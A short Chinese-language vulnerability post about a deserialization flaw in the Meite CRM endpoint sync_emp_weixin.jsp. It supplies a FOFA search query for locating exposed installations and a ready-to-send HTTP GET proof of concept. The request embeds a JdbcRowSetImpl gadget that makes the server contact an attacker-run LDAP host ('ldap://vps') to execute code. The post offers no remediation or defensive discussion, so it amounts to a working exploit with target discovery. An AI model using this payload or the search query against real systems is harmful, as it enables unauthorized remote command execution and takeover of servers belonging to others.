# 美特CRM系统接口sync_emp_weixin存在反序列化漏洞

美特CRM sync_emp_weixin存在反序列化漏洞，可被恶意攻击者利用执行任意命令，进而控制服务器系统。

## fofa

```
body="/common/scripts/basic.js"
```

## poc

```javascript
GET /weixin/admin/sync_emp_weixin.jsp?emp_json=[{%22@type%22:%22[com.sun.rowset.JdbcRowSetImpl%22[{,%22dataSourceName%22:%22ldap://vps%22,%22autoCommit%22:true}] HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection:close
```

![172b7391acfeadb4aaa11d4f2ca85f61](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411062301856.jpg)

![f1bd297bb76c5e5fa0b587da24d15bd4](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411062301906.jpg)

## 漏洞来源

- https://mp.weixin.qq.com/s/5t_w0ddXQslco6r0f9Rxgg
